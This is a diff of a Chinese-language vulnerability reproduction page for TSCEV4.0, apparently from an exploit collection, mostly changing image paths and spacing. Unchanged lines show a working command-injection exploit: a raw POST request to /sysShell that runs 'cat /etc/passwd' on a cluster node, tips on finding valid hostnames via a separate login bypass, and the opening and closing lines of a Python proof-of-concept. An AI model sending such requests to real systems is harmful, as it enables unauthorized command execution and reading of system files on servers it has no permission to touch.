@@ -18,21 +18,13 @@ title="TSCEV4.0"
 
 ## 漏洞复现
 
-
-
 登录页面如下
 
-
-
-![](images/202202091851299.png)
-
-
+![](<../.gitbook/assets/202202091851299 (1).png>)
 
 发送请求包
 
-
-
-```plain
+```
 POST /sysShell HTTP/1.1
 Host: xxx.xxx.xxx.xxx
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
@@ -45,31 +37,19 @@ Content-Length: 42
 op=doPlease&node=cu01&command=cat /etc/passwd
 ```
 
+![](../.gitbook/assets/202202091852805.png)
 
+* ✅注意参数 node 中的 cu01 需要为shell集群中的存在主机
 
-![](images/202202091852805.png)
-
-
-
-- ✅注意参数 node 中的 cu01 需要为shell集群中的存在主机
-
-
-
-![](images/202202091852553.png)
-
-
+![](../.gitbook/assets/202202091852553.png)
 
 这里可以配合任意用户登录漏洞查看主机名
-
-
 
 ## 漏洞POC
 
 如过出现 Name or service not
 
 请通过上述的方法查看 shell集群主机的名称（脚本默认 cu01）
-
-
 
 ```python
 import requests
@@ -136,11 +116,6 @@ if __name__ == '__main__':
     POC_1(target_url, cmd)
 ```
 
+![](../.gitbook/assets/202202091852927.png)
 
-
-![](images/202202091852927.png)
-
-
-
-## 
-
+##
